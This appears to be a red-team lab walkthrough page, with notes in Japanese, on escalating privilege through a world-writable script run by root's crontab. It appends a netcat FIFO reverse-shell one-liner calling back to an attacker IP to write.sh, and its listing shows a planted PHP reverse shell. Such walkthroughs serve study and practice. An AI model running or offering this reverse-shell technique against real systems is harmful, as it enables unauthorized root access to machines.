---
title: crontab
parent: Attack Repository
grand_parent: Red Team
nav_order: 151
---

# Check

```bash
cat /etc/crontab
```

```zsh
*/5  *    * * *   root    cd /var/www/html/ && sudo ./finally.sh
```

```zsh
* * * * * user command
│ │ │ │ │
│ │ │ │ └─ 曜日 (0-7)
│ │ │ └── 月
│ │ └─── 日
│ └──── 時
└───── 分
```
- */5 → 5分ごと
- root → root 権限で実行
- /var/www/html/ に移動
- finally.sh を sudo 付きで実行

つまり：

「5分おきに root が /var/www/html/finally.sh を実行している」

```bash
Command => pwd
/var/www/html/sar2HTML
```

```bash
Command => cat /var/www/html/finally.sh
#!/bin/sh
./write.sh
```

```bash
Command => cat /var/www/html/write.sh
#!/bin/sh
touch /tmp/gateway
```

# Privilege Escalation

```zsh
Command => ls -la /var/www/html
total 48
drwxr-xr-x 3 www-data www-data  4096 May 17 11:36 .
drwxr-xr-x 4 www-data www-data  4096 Jul 24  2020 ..
-rwxr-xr-x 1 root     root        22 Oct 20  2019 finally.sh
-rw-r--r-- 1 www-data www-data 10918 Oct 20  2019 index.html
-rwxrwxrwx 1 www-data www-data  5494 May 17 08:59 php-reverse-shell.php
-rw-r--r-- 1 www-data www-data    21 Oct 20  2019 phpinfo.php
-rw-r--r-- 1 root     root         9 Oct 21  2019 robots.txt
drwxr-xr-x 4 www-data www-data  4096 May 17 09:12 sar2HTML
-rwxrwxrwx 1 www-data www-data    30 Jul 24  2020 write.sh
```

```zsh
Command => id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

```bash
Command => echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.45.240 1234 >/tmp/f" >> /var/www/html/write.sh
```

